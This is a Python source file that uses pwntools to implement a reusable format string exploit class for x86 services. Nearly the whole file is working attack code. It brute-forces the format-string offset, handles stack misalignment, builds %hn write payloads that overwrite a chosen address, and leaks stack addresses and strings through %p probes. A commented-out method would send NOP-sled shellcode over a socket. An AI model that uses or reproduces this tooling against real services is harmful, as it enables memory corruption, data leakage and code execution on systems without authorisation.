# x86
# Overwrite the address of the var `overwrite` with the address of `wanted`
from pwn import *
from time import sleep


class FormatStringExploit:
    
    ### INITIALIZATION METHODS ###
    # region

    def __init__(self, dispatcher, verbose=False):
        self.verbose = verbose
        self.dispatcher = dispatcher
        self.x86 = True

        # Variables will be set during the exploit process
        self.offset, self.stack_alignment = None, None
        self.init_instructions = None

    def setup_init_instructions(self, init_instructions):
        """
        Set up the initial instructions to be at the beginning of the exploit.
        :param init_instructions: List of instructions to execute, this list should contain tuples of (command, argument)
                                  Commands can be "recv" or "send".
                                  Careful with the command "recv" for recv an int you should give an integer and not a string.
        :return: None
        """
        self.init_instructions = init_instructions
        if self.verbose:
            print("Initial instructions set up.")

    def update_offset_and_stack_alignment(self, offset, stack_alignment):
        """
        Update the offset and stack alignment for the exploit.
        :param offset: The offset to use in the format string exploit
        :param stack_alignment: The stack alignment to use in the exploit
        :return: None
        """
        self.offset = offset
        self.stack_alignment = stack_alignment
        if self.verbose:
            print(f"Offset updated to {self.offset}, Stack alignment updated to {self.stack_alignment}")
    # endregion

    ### INITIAL INSTRUCTION METHODS ###
    # region
    def launch_init_instructions(self):
        """
        Launch the initial instructions set up before the exploit.
        :return: None
        """
        if self.init_instructions:
            self.dispatcher.parse_instructions(self.init_instructions)
            if self.verbose:
                print("Initial instructions executed.")
        else:
            raise ValueError("Initial instructions not set up. Call setup_init_instructions() first.")
    # endregion

    ### FIND OFFSET AND STACK ALIGNMENT METHODS ###
    # region
    
    def find_offset(self, max_offset=100, delay_between_request=0, connect_and_close=False, retry_on_error=True):
        """
        Find the offset for the format string exploit.        :param max_offset: Maximum offset to try
        :param connect_and_close: Whether to connect and close the dispatcher for each offset
        :param retry_on_error: Whether to retry on error
        :return: The offset and the stack alignment if found, otherwise None
        """
        for i in range(1, max_offset + 1):
            try:
                # Attempt to connect to the target service
                if connect_and_close:
                    self.dispatcher.connect()
                    if self.init_instructions:
                        self.launch_init_instructions()
                else:
                    if not self.dispatcher.is_connected():
                        print("You must connect before sending commands or enable connect_and_close.")
                        return None, None

                # Craft the string bug command
                # The command is designed to trigger a format string vulnerability
                command = b"AAAA" + b"%" + bytes(str(i), 'utf-8') + b"$x"

                # Send the command and receive the response
                self.dispatcher.send_command(command)
                response = self.dispatcher.receive_response()

                if self.verbose:
                    print(f"Response for offset {i}: {response}")
                
                # Close the connection if specified
                if connect_and_close:
                    self.dispatcher.close()

                # Check if the response contains the address we are looking for
                if b"41414141" in response:
                    if self.verbose:
                        print(f"[+] Found offset: {i}")
                    self.offset = i
                    return i, 0
                # Check for non-aligned addresses
                if b"41" in response:
                    stack_alignment = self.find_none_aligned_offset(i)
                    if stack_alignment is not None:
                        if self.verbose:
                            print(f"[+] Found non-aligned offset: {i} with stack alignment: {stack_alignment}")
                        self.offset = i
                        return self.offset, stack_alignment
                    
            except Exception as e:
                if self.verbose:
                    print(f"Error finding offset {i}: {e}")
                if not retry_on_error:
                    break
            if delay_between_request > 0:
                sleep(delay_between_request)
        return None, None
    
    def find_none_aligned_offset(self, offset):
        """Find the offset for the format string exploit with non-aligned addresses."""
        range_offset = 4 if self.x86 else 8
        for i in range(1, range_offset):
            try:
                # Attempt to connect to the target service
                self.dispatcher.connect()
                command = b"4" * (4 + i) + b"%" + bytes(str(offset), 'utf-8') + b"$x"
                self.dispatcher.send_command(command)
                response = self.dispatcher.receive_response()
                if self.verbose:
                    print(f"Response for offset {offset + i}: {response}")
                if b"41414141" in response:
                    if self.verbose:
                        print(f"[+] Found non-aligned offset: {offset + i}")
                    return i
            except Exception as e:
                if self.verbose:
                    print(f"Error finding non-aligned offset {offset + i}: {e}")
        return None
    # endregion

    ### PAYLOAD GENERATION METHODS ###
    # region

    def split_address(self, address):
        """Split an address into high and low 16 bits."""
        high = (address >> 16) & 0xFFFF
        low = address & 0xFFFF
        if high > low:
            if self.verbose:
                print(f"High 16 bits: {high:#06x}, Low 16 bits: {low:#06x}")
            return high, low, False
        else:
            if self.verbose:
                print(f"High 16 bits: {low:#06x}, Low 16 bits: {high:#06x} (swapped)")
            return low, high, True
        
    def return_payload(self, address_overwrite, address_wanted, stack_alignment=0):
        """Generate the payload to overwrite the address."""
        high_16, low_16, swapped = self.split_address(address_wanted)

        first_offset = bytes(str(low_16 - stack_alignment - 8), 'utf-8')
        second_offset = bytes(str(high_16 - low_16), 'utf-8')
        # Add stack alignment
        payload = b"\x90" * stack_alignment

        # Add the address to overwrite
        payload += p32(address_overwrite)
        # Add the second address to overwrite
        payload += p32(address_overwrite + 0x2)

        # Contruct the format string payload
        payload += b"%" + first_offset + b"c"
        if swapped:
            payload += b'%' + bytes(str(self.offset + 1), 'utf-8') + b'$hn'
        else:
            payload += b'%' + bytes(str(self.offset), 'utf-8') + b'$hn'
        payload += b"%" + second_offset + b"c"
        if swapped:
            payload += b'%' + bytes(str(self.offset), 'utf-8') + b'$hn'
        else:
            payload += b'%' + bytes(str(self.offset + 1), 'utf-8') + b'$hn'
        if self.verbose:
            print(f"Payload length: {len(payload)}")
            print(payload)
        return payload
    # endregion

    def return_stack_addresses(self, filter_addresses=None, max_length=1000, delay_between_request=0.1, connect_and_close=False, retry_on_error=True):
        """
        Return all addresses between range in filter_addresses.
        :param filter_addresses: List of tuples (address_low, address_sup) to filter addresses. If this is None, all addresses will be returned.
        :param max_length: Maximum length of the stack to search for addresses
        :return: List of tuples (offset, address) where offset is the offset in the format string and address is the address found in the stack
        """

        addresses = []
        if filter_addresses is None:
            filter_addresses = []

        # Main loop to find addresses in the stack
        for i in range(1, max_length + 1):
            # Attempt to connect to the target service
            if connect_and_close:
                self.dispatcher.connect()
                if self.init_instructions:
                    self.launch_init_instructions()
    
            # Craft the command to send
            command = b"%" + bytes(str(i), 'utf-8') + b"$p"

            # Send the command and receive the response
            self.dispatcher.send_command(command)
            try:
                response = self.dispatcher.receive_response()
            except Exception as e:
                if self.verbose:
                    print(f"Error receiving response for offset {i}: {e}")
                if not retry_on_error:
                    break
                continue

            if response == b"" or response == b"(nil)":
                continue  # Skip empty responses

            # Add all addresses if no filter is provided
            if len(filter_addresses) == 0:
                addresses.append((i, int(response, 16)))

            # Check if the response is valid
            for address_low, address_sup in filter_addresses:
                
                int_address_response = int(response, 16)
                    
                # Check if the address is within the specified range
                if address_low <= int_address_response <= address_sup:
                    if self.verbose:
                        print(f"Found address: {int_address_response:#x} for offset {i}")

                    # Check if the address is not already in the list
                    if not any(int_address_response == addr[1] for addr in addresses):
                        addresses.append((i, int_address_response))
                        break
            # Delay between requests if specified
            if delay_between_request > 0:
                sleep(delay_between_request)
            
            # Close the connection if specified
            if connect_and_close:
                self.dispatcher.close()

            if self.verbose:
                print(f"Response for offset {i}: {response}")
        if self.verbose:
            print(f"Found {len(addresses)} addresses in the stack.")
        return addresses
    
    def print_stack_strings(self, max_length=1000, delay_between_request=0.1, connect_and_close=False, retry_on_error=True):
        """
        Print the strings found in the stack.
        :return: None
        """
        if self.offset is None or self.stack_alignment is None:
            raise ValueError("Offset and stack alignment must be set before generating the stack.")

        # Main loop to find addresses in the stack
        for i in range(1, max_length + 1):
            # Attempt to connect to the target service
            if connect_and_close:
                self.dispatcher.connect()
                if self.init_instructions:
                    self.launch_init_instructions()
    
            # Craft the command to send
            command = b"%" + bytes(str(i), 'utf-8') + b"$p"

            # Send the command and receive the response
            self.dispatcher.send_command(command)
            try:
                response = self.dispatcher.receive_response()
            except Exception as e:
                if self.verbose:
                    print(f"Error receiving response for offset {i}: {e}")
                if not retry_on_error:
                    break
                continue

            if response == b"" or response == b"(nil)":
                continue  # Skip empty responses

            # Print the response as a string
            try:
                response_str = response.decode('utf-8', errors='ignore')
                print(f"Offset {i}: {response_str}")
            except UnicodeDecodeError:
                print(f"Offset {i}: Non-decodable response: {response}")

            # Delay between requests if specified
            if delay_between_request > 0:
                sleep(delay_between_request)
            
            # Close the connection if specified
            if connect_and_close:
                self.dispatcher.close()

            if self.verbose:
                print(f"Response for offset {i}: {response}")

        


    # def exploit_shellcode(self, HOST, PORT, buf, offset, NOPE=100):
    #     """Send the payload with shellcode to the target server."""
    #     payload = self.return_payload(offset)
    #     payload += b"\x90" * (NOPE - len(payload) - len(buf))
    #     payload += buf
    #     try:
    #         s = socket.create_connection((HOST, PORT))
    #         s.send(payload)
    #         if self.verbose:
    #             print("Payload with shellcode sent successfully.")
    #         s.close()
    #     except Exception as e:
    #         print(f"Error during exploit with shellcode: {e}")